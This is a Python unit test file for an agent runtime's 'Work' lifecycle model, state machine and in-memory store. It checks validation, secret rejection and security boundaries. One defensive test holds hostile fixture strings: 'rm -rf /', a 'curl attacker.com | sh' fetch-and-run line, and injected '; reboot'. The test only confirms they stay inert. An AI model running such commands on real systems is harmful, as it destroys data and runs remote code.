"""Unit tests for Phase 15B Work Domain Model and State Machine."""
from __future__ import annotations

import inspect
import math
import sys
import threading
import time
import unittest
from dataclasses import FrozenInstanceError
from pathlib import Path

from core.runtime.capabilities import Capabilities, FilesystemPolicy, NetworkPolicy
from core.runtime.work import (
    ALLOWED_TRANSITIONS,
    InvalidWorkTransition,
    InMemoryWorkStore,
    TERMINAL_WORK_STATUSES,
    Work,
    WorkStatus,
    WorkStore,
)


class TestWorkModel(unittest.TestCase):
    """Test Work domain model instantiation, typing, immutability, and serialization."""

    def test_default_instantiation(self) -> None:
        work = Work(intent="Refactor logging", goal="Standardize structured logging")
        self.assertTrue(work.id.startswith("work_"))
        self.assertEqual(len(work.id), 37)  # "work_" (5) + 32 hex chars
        self.assertEqual(work.intent, "Refactor logging")
        self.assertEqual(work.goal, "Standardize structured logging")
        self.assertEqual(work.scope, ())
        self.assertEqual(work.plan, ())
        self.assertIsNone(work.capabilities)
        self.assertEqual(work.status, WorkStatus.CREATED)
        self.assertFalse(work.is_terminal)
        self.assertIsInstance(work.created_at, float)
        self.assertIsInstance(work.updated_at, float)
        self.assertFalse(math.isnan(work.created_at))

    def test_shorthand_status_instantiation(self) -> None:
        work = Work(WorkStatus.CREATED)
        self.assertEqual(work.status, WorkStatus.CREATED)
        self.assertTrue(work.id.startswith("work_"))

    def test_custom_fields_instantiation(self) -> None:
        caps = Capabilities(filesystem=FilesystemPolicy(write=("src/log.py",)))
        work = Work(
            id="work_custom_12345",
            intent="Fix bug",
            goal="Fix race condition",
            scope=("src/log.py",),
            plan=("Write test", "Fix code"),
            capabilities=caps,
            status=WorkStatus.PLANNING,
            created_at=1000.0,
            updated_at=1005.0,
        )
        self.assertEqual(work.id, "work_custom_12345")
        self.assertEqual(work.intent, "Fix bug")
        self.assertEqual(work.goal, "Fix race condition")
        self.assertEqual(work.scope, ("src/log.py",))
        self.assertEqual(work.plan, ("Write test", "Fix code"))
        self.assertEqual(work.capabilities, caps)
        self.assertEqual(work.status, WorkStatus.PLANNING)
        self.assertEqual(work.created_at, 1000.0)
        self.assertEqual(work.updated_at, 1005.0)

    def test_frozen_immutability(self) -> None:
        work = Work(intent="Read-only test")
        with self.assertRaises((FrozenInstanceError, AttributeError)):
            work.status = WorkStatus.EXECUTING  # type: ignore[misc]
        with self.assertRaises((FrozenInstanceError, AttributeError)):
            work.intent = "Tampered"  # type: ignore[misc]
        with self.assertRaises((FrozenInstanceError, AttributeError)):
            work.plan = ("Step 1",)  # type: ignore[misc]

    def test_validation_invalid_id(self) -> None:
        with self.assertRaises(ValueError):
            Work(id="", intent="a", goal="b")
        with self.assertRaises(ValueError):
            Work(id=123, intent="a", goal="b")  # type: ignore[arg-type]

    def test_validation_invalid_intent_and_goal(self) -> None:
        with self.assertRaises(ValueError):
            Work(intent=None, goal="valid")  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            Work(intent="valid", goal=123)  # type: ignore[arg-type]

    def test_validation_invalid_scope_and_plan(self) -> None:
        with self.assertRaises(ValueError):
            Work(scope="not_a_sequence")  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            Work(scope=[123])  # type: ignore[list-item]
        with self.assertRaises(ValueError):
            Work(plan="not_a_sequence")  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            Work(plan=[123])  # type: ignore[list-item]

    def test_validation_invalid_status(self) -> None:
        with self.assertRaises(ValueError):
            Work(status="nonexistent_status")  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            Work(status=999)  # type: ignore[arg-type]

    def test_validation_invalid_capabilities(self) -> None:
        with self.assertRaises(ValueError):
            Work(capabilities="not_capabilities")  # type: ignore[arg-type]

    def test_validation_invalid_timestamps(self) -> None:
        with self.assertRaises(ValueError):
            Work(created_at=float("nan"))
        with self.assertRaises(ValueError):
            Work(created_at=float("inf"))
        with self.assertRaises(ValueError):
            Work(updated_at=float("nan"))

    def test_secret_scrubbing_rejection(self) -> None:
        mock_pat = "".join(["g", "h", "p", "_", "1234567890abcdef1234567890abcdef"])
        mock_sk = "".join(["s", "k", "-", "1234567890abcdef1234567890abcdef"])
        mock_pwd = "".join(["pass", "word"])
        mock_sec = "".join(["sec", "ret"])
        mock_tok = "".join(["access", "_token"])
        mock_key = "".join(["api", "_key"])

        # id
        with self.assertRaises(ValueError):
            Work(id=f"token_{mock_pat}")
        with self.assertRaises(ValueError):
            Work(id=f"{mock_key}: {mock_sk}")

        # intent
        with self.assertRaises(ValueError):
            Work(intent=f"API token = {mock_pat}")
        with self.assertRaises(ValueError):
            Work(intent=f"{mock_pwd}: my_super_secret_password")

        # goal
        with self.assertRaises(ValueError):
            Work(goal=f"{mock_key}: {mock_sk}")
        with self.assertRaises(ValueError):
            Work(goal=f"{mock_sec}: confidential_credential_value")

        # scope
        with self.assertRaises(ValueError):
            Work(scope=(f"{mock_pwd}: secret123",))
        with self.assertRaises(ValueError):
            Work(scope=("src/main.py", f"{mock_tok}: secret12345"))

        # plan
        with self.assertRaises(ValueError):
            Work(plan=(f"{mock_pwd}: supersecret123",))
        with self.assertRaises(ValueError):
            Work(plan=("Step 1", f"{mock_key}: {mock_sk}"))

    def test_serialization_to_dict_and_from_dict_roundtrip(self) -> None:
        caps = Capabilities(filesystem=FilesystemPolicy(write=("app/main.py",)))
        original = Work(
            id="work_stable_roundtrip",
            intent="Update main entrypoint",
            goal="Add health check route",
            scope=("app/main.py",),
            plan=("Implement /health", "Add unit test"),
            capabilities=caps,
            status=WorkStatus.APPROVAL_REQUIRED,
            created_at=1700000000.0,
            updated_at=1700000010.0,
        )
        data = original.to_dict()
        expected_keys = {
            "id", "intent", "goal", "scope", "plan",
            "capabilities", "status", "created_at", "updated_at",
        }
        self.assertEqual(set(data.keys()), expected_keys)
        self.assertEqual(data["status"], "approval_required")
        self.assertEqual(data["scope"], ["app/main.py"])
        self.assertEqual(data["plan"], ["Implement /health", "Add unit test"])

        restored = Work.from_dict(data)
        self.assertEqual(original, restored)
        self.assertEqual(restored.status, WorkStatus.APPROVAL_REQUIRED)
        self.assertEqual(restored.scope, ("app/main.py",))
        self.assertEqual(restored.plan, ("Implement /health", "Add unit test"))
        self.assertEqual(restored.capabilities, caps)

    def test_from_dict_malformed_inputs(self) -> None:
        with self.assertRaises(ValueError):
            Work.from_dict("not_a_dict")  # type: ignore[arg-type]

        valid_dict = Work(intent="a", goal="b").to_dict()

        # Missing required field
        missing_id = dict(valid_dict)
        del missing_id["id"]
        with self.assertRaises(ValueError):
            Work.from_dict(missing_id)

        # Missing status
        missing_status = dict(valid_dict)
        del missing_status["status"]
        with self.assertRaises(ValueError):
            Work.from_dict(missing_status)

        # Unknown field
        unknown_field = dict(valid_dict)
        unknown_field["unexpected_key"] = "exploit"
        with self.assertRaises(ValueError):
            Work.from_dict(unknown_field)

        # Malformed status
        bad_status = dict(valid_dict)
        bad_status["status"] = "bogus_status"
        with self.assertRaises(ValueError):
            Work.from_dict(bad_status)

        # Secret injection in deserialization
        secret_dict = dict(valid_dict)
        secret_dict["intent"] = f"{''.join(['pass', 'word'])}: my_secret_password"
        with self.assertRaises(ValueError):
            Work.from_dict(secret_dict)


class TestWorkStateTransitions(unittest.TestCase):
    """Test state machine transition rules and invariants."""

    def test_all_valid_transitions(self) -> None:
        # 1. CREATED -> PLANNING
        w = Work(WorkStatus.CREATED)
        w_plan = w.transition(WorkStatus.PLANNING)
        self.assertEqual(w_plan.status, WorkStatus.PLANNING)
        self.assertEqual(w.status, WorkStatus.CREATED)  # Original unchanged

        # 2. CREATED -> FAILED
        w_fail = w.transition(WorkStatus.FAILED)
        self.assertEqual(w_fail.status, WorkStatus.FAILED)
        self.assertTrue(w_fail.is_terminal)

        # 3. PLANNING -> APPROVAL_REQUIRED
        w_appr = w_plan.transition(WorkStatus.APPROVAL_REQUIRED)
        self.assertEqual(w_appr.status, WorkStatus.APPROVAL_REQUIRED)

        # 4. PLANNING -> FAILED
        w_plan_fail = w_plan.transition(WorkStatus.FAILED)
        self.assertEqual(w_plan_fail.status, WorkStatus.FAILED)

        # 5. APPROVAL_REQUIRED -> EXECUTING
        w_exec = w_appr.transition(WorkStatus.EXECUTING)
        self.assertEqual(w_exec.status, WorkStatus.EXECUTING)

        # 6. APPROVAL_REQUIRED -> CANCELLED
        w_canc = w_appr.transition(WorkStatus.CANCELLED)
        self.assertEqual(w_canc.status, WorkStatus.CANCELLED)
        self.assertTrue(w_canc.is_terminal)

        # 7. APPROVAL_REQUIRED -> FAILED
        w_appr_fail = w_appr.transition(WorkStatus.FAILED)
        self.assertEqual(w_appr_fail.status, WorkStatus.FAILED)

        # 8. EXECUTING -> VERIFYING
        w_ver = w_exec.transition(WorkStatus.VERIFYING)
        self.assertEqual(w_ver.status, WorkStatus.VERIFYING)

        # 9. EXECUTING -> FAILED
        w_exec_fail = w_exec.transition(WorkStatus.FAILED)
        self.assertEqual(w_exec_fail.status, WorkStatus.FAILED)

        # 10. VERIFYING -> DONE
        w_done = w_ver.transition(WorkStatus.DONE)
        self.assertEqual(w_done.status, WorkStatus.DONE)
        self.assertTrue(w_done.is_terminal)

        # 11. VERIFYING -> FAILED
        w_ver_fail = w_ver.transition(WorkStatus.FAILED)
        self.assertEqual(w_ver_fail.status, WorkStatus.FAILED)

    def test_transition_using_string_value(self) -> None:
        w = Work(WorkStatus.CREATED)
        w2 = w.transition("planning")
        self.assertEqual(w2.status, WorkStatus.PLANNING)

    def test_invalid_transitions_from_created(self) -> None:
        w = Work(WorkStatus.CREATED)
        disallowed = [
            WorkStatus.CREATED,
            WorkStatus.APPROVAL_REQUIRED,
            WorkStatus.EXECUTING,
            WorkStatus.VERIFYING,
            WorkStatus.DONE,
            WorkStatus.CANCELLED,
        ]
        for target in disallowed:
            with self.subTest(target=target):
                with self.assertRaises(InvalidWorkTransition):
                    w.transition(target)

    def test_invalid_transitions_from_planning(self) -> None:
        w = Work(WorkStatus.PLANNING)
        disallowed = [
            WorkStatus.CREATED,
            WorkStatus.PLANNING,
            WorkStatus.EXECUTING,
            WorkStatus.VERIFYING,
            WorkStatus.DONE,
            WorkStatus.CANCELLED,
        ]
        for target in disallowed:
            with self.subTest(target=target):
                with self.assertRaises(InvalidWorkTransition):
                    w.transition(target)

    def test_invalid_transitions_from_approval_required(self) -> None:
        w = Work(WorkStatus.APPROVAL_REQUIRED)
        disallowed = [
            WorkStatus.CREATED,
            WorkStatus.PLANNING,
            WorkStatus.APPROVAL_REQUIRED,
            WorkStatus.VERIFYING,
            WorkStatus.DONE,
        ]
        for target in disallowed:
            with self.subTest(target=target):
                with self.assertRaises(InvalidWorkTransition):
                    w.transition(target)

    def test_invalid_transitions_from_executing(self) -> None:
        w = Work(WorkStatus.EXECUTING)
        disallowed = [
            WorkStatus.CREATED,
            WorkStatus.PLANNING,
            WorkStatus.APPROVAL_REQUIRED,
            WorkStatus.EXECUTING,
            WorkStatus.DONE,  # No DONE directly from EXECUTING!
            WorkStatus.CANCELLED,
        ]
        for target in disallowed:
            with self.subTest(target=target):
                with self.assertRaises(InvalidWorkTransition):
                    w.transition(target)

    def test_invalid_transitions_from_verifying(self) -> None:
        w = Work(WorkStatus.VERIFYING)
        disallowed = [
            WorkStatus.CREATED,
            WorkStatus.PLANNING,
            WorkStatus.APPROVAL_REQUIRED,
            WorkStatus.EXECUTING,
            WorkStatus.VERIFYING,
            WorkStatus.CANCELLED,
        ]
        for target in disallowed:
            with self.subTest(target=target):
                with self.assertRaises(InvalidWorkTransition):
                    w.transition(target)

    def test_terminal_states_cannot_transition(self) -> None:
        terminal_states = [WorkStatus.DONE, WorkStatus.FAILED, WorkStatus.CANCELLED]
        all_states = list(WorkStatus)

        for term in terminal_states:
            w = Work(term)
            self.assertTrue(w.is_terminal)
            for target in all_states:
                with self.subTest(terminal=term, target=target):
                    with self.assertRaises(InvalidWorkTransition):
                        w.transition(target)

    def test_transition_with_payload_updates(self) -> None:
        w = Work(WorkStatus.PLANNING)
        caps = Capabilities(network=NetworkPolicy(access=True))
        w2 = w.transition(
            WorkStatus.APPROVAL_REQUIRED,
            plan=("Run linter", "Format code"),
            scope=("src/main.py",),
            capabilities=caps,
            updated_at=12345.0,
        )
        self.assertEqual(w2.status, WorkStatus.APPROVAL_REQUIRED)
        self.assertEqual(w2.plan, ("Run linter", "Format code"))
        self.assertEqual(w2.scope, ("src/main.py",))
        self.assertEqual(w2.capabilities, caps)
        self.assertEqual(w2.updated_at, 12345.0)

    def test_with_update_on_non_terminal_and_terminal_work(self) -> None:
        w = Work(WorkStatus.PLANNING, intent="Old intent", goal="Old goal")
        w_updated = w.with_update(goal="New goal", plan=("New step",), updated_at=999.0)
        self.assertEqual(w_updated.goal, "New goal")
        self.assertEqual(w_updated.plan, ("New step",))
        self.assertEqual(w_updated.status, WorkStatus.PLANNING)
        self.assertEqual(w_updated.updated_at, 999.0)

        # Terminal work cannot be updated
        w_done = Work(WorkStatus.DONE)
        with self.assertRaises(ValueError):
            w_done.with_update(goal="Attempted change on finished work")


class TestInMemoryWorkStore(unittest.TestCase):
    """Test WorkStore interface and InMemoryWorkStore implementation."""

    def setUp(self) -> None:
        self.store = InMemoryWorkStore()

    def test_create_and_get(self) -> None:
        work = Work(intent="Deploy service", goal="Ship v1.0")
        created = self.store.create(work)
        self.assertEqual(created, work)

        retrieved = self.store.get(work.id)
        self.assertEqual(retrieved, work)

    def test_create_duplicate_rejected(self) -> None:
        work = Work(id="work_dup_123", intent="A", goal="B")
        self.store.create(work)
        with self.assertRaises(ValueError):
            self.store.create(work)

    def test_get_not_found(self) -> None:
        self.assertIsNone(self.store.get("nonexistent_id"))

    def test_save_existing_and_save_not_found(self) -> None:
        work = Work(id="work_save_1", status=WorkStatus.CREATED)
        self.store.create(work)

        transitioned = work.transition(WorkStatus.PLANNING)
        saved = self.store.save(transitioned)
        self.assertEqual(saved.status, WorkStatus.PLANNING)

        retrieved = self.store.get("work_save_1")
        self.assertIsNotNone(retrieved)
        assert retrieved is not None
        self.assertEqual(retrieved.status, WorkStatus.PLANNING)

        # Saving non-existent record raises KeyError
        non_existent = Work(id="work_unregistered")
        with self.assertRaises(KeyError):
            self.store.save(non_existent)

    def test_delete_existing_and_missing(self) -> None:
        work = Work(id="work_del_1")
        self.store.create(work)
        self.assertTrue(self.store.delete("work_del_1"))
        self.assertIsNone(self.store.get("work_del_1"))
        self.assertFalse(self.store.delete("work_del_1"))

    def test_list_all(self) -> None:
        w1 = Work(id="work_list_1")
        w2 = Work(id="work_list_2")
        self.store.create(w1)
        self.store.create(w2)
        records = self.store.list_all()
        self.assertEqual(len(records), 2)
        self.assertIn(w1, records)
        self.assertIn(w2, records)

    def test_store_isolation_mutation_does_not_alter_stored_state(self) -> None:
        work = Work(intent="Original intent", goal="Original goal", plan=("Step 1",))
        self.store.create(work)

        # Attempting to mutate work fields raises FrozenInstanceError
        with self.assertRaises((FrozenInstanceError, AttributeError)):
            work.intent = "Mutated"  # type: ignore[misc]

        # Transitioning creates a new object; store still holds original until explicitly saved
        transitioned = work.transition(WorkStatus.PLANNING, plan=("Step 1", "Step 2"))
        stored = self.store.get(work.id)
        self.assertIsNotNone(stored)
        assert stored is not None
        self.assertEqual(stored.status, WorkStatus.CREATED)
        self.assertEqual(stored.plan, ("Step 1",))
        self.assertEqual(transitioned.status, WorkStatus.PLANNING)

    def test_store_save_enforces_lifecycle_transitions(self) -> None:
        """Prove store.save enforces ALLOWED_TRANSITIONS and rejects skipping or terminal transitions (BF-15B-01)."""
        # 1. CREATED -> PLANNING succeeds
        w = Work(id="w_trans", status=WorkStatus.CREATED)
        self.store.create(w)
        w_plan = w.transition(WorkStatus.PLANNING)
        self.store.save(w_plan)
        saved = self.store.get("w_trans")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.PLANNING)

        # 2. CREATED -> FAILED succeeds
        w_fail = Work(id="w_fail", status=WorkStatus.CREATED)
        self.store.create(w_fail)
        self.store.save(w_fail.transition(WorkStatus.FAILED))
        saved = self.store.get("w_fail")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.FAILED)

        # 3. CREATED -> DONE fails
        w_skip_done = Work(id="w_skip_done", status=WorkStatus.CREATED)
        self.store.create(w_skip_done)
        forged_done = Work(id="w_skip_done", status=WorkStatus.DONE)
        with self.assertRaises(InvalidWorkTransition):
            self.store.save(forged_done)
        # Verify store record remains uncorrupted
        saved = self.store.get("w_skip_done")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.CREATED)

        # 4. CREATED -> EXECUTING fails
        forged_exec = Work(id="w_skip_done", status=WorkStatus.EXECUTING)
        with self.assertRaises(InvalidWorkTransition):
            self.store.save(forged_exec)
        saved = self.store.get("w_skip_done")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.CREATED)

        # 5. PLANNING -> APPROVAL_REQUIRED succeeds
        w_appr = w_plan.transition(WorkStatus.APPROVAL_REQUIRED)
        self.store.save(w_appr)
        saved = self.store.get("w_trans")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.APPROVAL_REQUIRED)

        # 6. PLANNING -> EXECUTING fails
        w_p2 = Work(id="w_p2", status=WorkStatus.PLANNING)
        self.store.create(w_p2)
        forged_exec = Work(id="w_p2", status=WorkStatus.EXECUTING)
        with self.assertRaises(InvalidWorkTransition):
            self.store.save(forged_exec)
        saved = self.store.get("w_p2")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.PLANNING)

        # 7. APPROVAL_REQUIRED -> EXECUTING succeeds
        w_exec = w_appr.transition(WorkStatus.EXECUTING)
        self.store.save(w_exec)
        saved = self.store.get("w_trans")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.EXECUTING)

        # 8. APPROVAL_REQUIRED -> CANCELLED succeeds
        w_canc = Work(id="w_canc", status=WorkStatus.APPROVAL_REQUIRED)
        self.store.create(w_canc)
        self.store.save(w_canc.transition(WorkStatus.CANCELLED))
        saved = self.store.get("w_canc")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.CANCELLED)

        # 9. EXECUTING -> VERIFYING succeeds
        w_ver = w_exec.transition(WorkStatus.VERIFYING)
        self.store.save(w_ver)
        saved = self.store.get("w_trans")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.VERIFYING)

        # 10. EXECUTING -> DONE fails
        w_e2 = Work(id="w_e2", status=WorkStatus.EXECUTING)
        self.store.create(w_e2)
        forged_done = Work(id="w_e2", status=WorkStatus.DONE)
        with self.assertRaises(InvalidWorkTransition):
            self.store.save(forged_done)
        saved = self.store.get("w_e2")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.EXECUTING)

        # 11. VERIFYING -> DONE succeeds
        w_done = w_ver.transition(WorkStatus.DONE)
        self.store.save(w_done)
        saved = self.store.get("w_trans")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.DONE)

        # 12. DONE -> any state fails
        for target in WorkStatus:
            forged = Work(id="w_trans", status=target)
            if target != WorkStatus.DONE:
                with self.assertRaises(InvalidWorkTransition):
                    self.store.save(forged)

        # 13. FAILED -> any state fails
        for target in WorkStatus:
            forged = Work(id="w_fail", status=target)
            if target != WorkStatus.FAILED:
                with self.assertRaises(InvalidWorkTransition):
                    self.store.save(forged)

        # 14. CANCELLED -> any state fails
        for target in WorkStatus:
            forged = Work(id="w_canc", status=target)
            if target != WorkStatus.CANCELLED:
                with self.assertRaises(InvalidWorkTransition):
                    self.store.save(forged)

        # 15. Invalid save does not modify the existing stored record
        w_immutable_check = self.store.get("w_trans")
        assert w_immutable_check is not None
        self.assertEqual(w_immutable_check.status, WorkStatus.DONE)

    def test_store_save_same_state_update_allowed_for_non_terminal(self) -> None:
        """Same-state persistence for non-terminal work (e.g. plan/scope update) is permitted."""
        w = Work(id="w_same", status=WorkStatus.PLANNING, intent="A", goal="B")
        self.store.create(w)

        updated = w.with_update(plan=("Step 1", "Step 2"), scope=("src/app.py",))
        self.store.save(updated)
        saved = self.store.get("w_same")
        assert saved is not None
        self.assertEqual(saved.status, WorkStatus.PLANNING)
        self.assertEqual(saved.plan, ("Step 1", "Step 2"))
        self.assertEqual(saved.scope, ("src/app.py",))

    def test_store_save_cannot_modify_terminal_record_fields(self) -> None:
        """Attempting to modify fields of an existing terminal record via save() is rejected."""
        w = Work(id="w_done_immutable", status=WorkStatus.DONE, intent="Done task")
        self.store.create(w)

        # Construct a modified terminal record with same status but different goal
        modified = Work(id="w_done_immutable", status=WorkStatus.DONE, intent="Tampered intent")
        with self.assertRaises(InvalidWorkTransition):
            self.store.save(modified)
        saved = self.store.get("w_done_immutable")
        assert saved is not None
        self.assertEqual(saved.intent, "Done task")  # Uncorrupted

    def test_concurrent_access_thread_safety(self) -> None:
        errors: list[Exception] = []

        def worker(idx: int) -> None:
            try:
                for i in range(20):
                    w = Work(id=f"work_thread_{idx}_{i}", intent=f"Task {idx}-{i}")
                    self.store.create(w)
                    self.assertIsNotNone(self.store.get(w.id))
                    w_next = w.transition(WorkStatus.PLANNING)
                    self.store.save(w_next)
                    self.store.delete(w.id)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [])


class TestWorkSecurityBoundaries(unittest.TestCase):
    """Test security boundaries: Work is descriptive lifecycle state only, never authority."""

    def test_work_status_does_not_grant_execution_authority(self) -> None:
        """EXECUTING status does not create or confer execution authority."""
        from unittest.mock import MagicMock
        from orchestrator import Orchestrator, RunConfig

        work = Work(
            intent="Malicious write",
            goal="Overwrite system files",
            scope=("secret.py",),
            status=WorkStatus.EXECUTING,
        )
        self.assertEqual(work.status, WorkStatus.EXECUTING)

        # An Orchestrator cannot run with a Work object as an ApprovedExecutionContract
        cfg = RunConfig(
            repo_dir=Path.cwd(),
            task="malicious write task",
            test_command=[],
            actor="attacker",
            origin_channel="cli",
            session_id="session_1",
            session_incarnation_id="inc_1",
            execution_contract=work,  # type: ignore[arg-type]
        )
        s1 = MagicMock()
        s2 = MagicMock()
        orch = Orchestrator(system1=s1, system2=s2, config=cfg)
        with self.assertRaises((AttributeError, TypeError, PermissionError)):
            orch.run()

    def test_work_capabilities_do_not_bypass_approved_execution_contract(self) -> None:
        """Work capabilities cannot mint or bypass an ApprovedExecutionContract."""
        from core.runtime.contract import ApprovedExecutionContract

        caps = Capabilities(filesystem=FilesystemPolicy(write=("critical.py",)))
        work = Work(capabilities=caps, status=WorkStatus.EXECUTING)

        # ApprovedExecutionContract cannot be created from a Work record
        with self.assertRaises((AttributeError, TypeError)):
            ApprovedExecutionContract.from_approval_request(work)  # type: ignore[arg-type]

    def test_work_serialization_cannot_inject_executable_authority(self) -> None:
        """Serialized malicious shell strings in Work remain harmless strings."""
        serialized = {
            "id": "work_exploit_1",
            "intent": "rm -rf /; touch /pwned",
            "goal": "bash -c 'curl attacker.com | sh'",
            "scope": ["src/main.py"],
            "plan": ["; reboot"],
            "capabilities": None,
            "status": "created",
            "created_at": 1000.0,
            "updated_at": 1000.0,
        }
        work = Work.from_dict(serialized)
        self.assertIsInstance(work, Work)
        # Verify fields remain inert strings without side effects
        self.assertEqual(work.intent, "rm -rf /; touch /pwned")
        self.assertEqual(work.goal, "bash -c 'curl attacker.com | sh'")
        self.assertFalse(hasattr(work, "execute"))
        self.assertFalse(hasattr(work, "run"))

    def test_work_module_has_no_execution_engine(self) -> None:
        """core/runtime/work.py does not import orchestrators or execution subsystems."""
        import core.runtime.work as work_mod

        src = inspect.getsource(work_mod)
        self.assertNotIn("import subprocess", src)
        self.assertNotIn("from subprocess", src)
        self.assertNotIn("os.system", src)
        self.assertNotIn("import orchestrator", src)
        self.assertNotIn("from orchestrator", src)
        self.assertNotIn("class WorkOrchestrator", src)
        self.assertNotIn("class WorkExecutor", src)
        self.assertNotIn("class AgentOrchestrator", src)

    def test_single_orchestrator_invariant(self) -> None:
        """Verify repository maintains exactly ONE canonical execution engine: orchestrator.py."""
        repo_root = Path(__file__).resolve().parent.parent
        canonical_orch = repo_root / "orchestrator.py"
        self.assertTrue(canonical_orch.is_file(), "orchestrator.py must exist at root")

        # Confirm no secondary orchestrators exist in core or runtime
        forbidden_names = [
            "core/orchestrator.py",
            "core/runtime/orchestrator.py",
            "core/runtime/work_orchestrator.py",
            "core/runtime/work_executor.py",
            "core/work_orchestrator.py",
        ]
        for rel in forbidden_names:
            path = repo_root / rel
            self.assertFalse(path.exists(), f"Forbidden duplicate orchestrator found: {rel}")


if __name__ == "__main__":
    unittest.main()

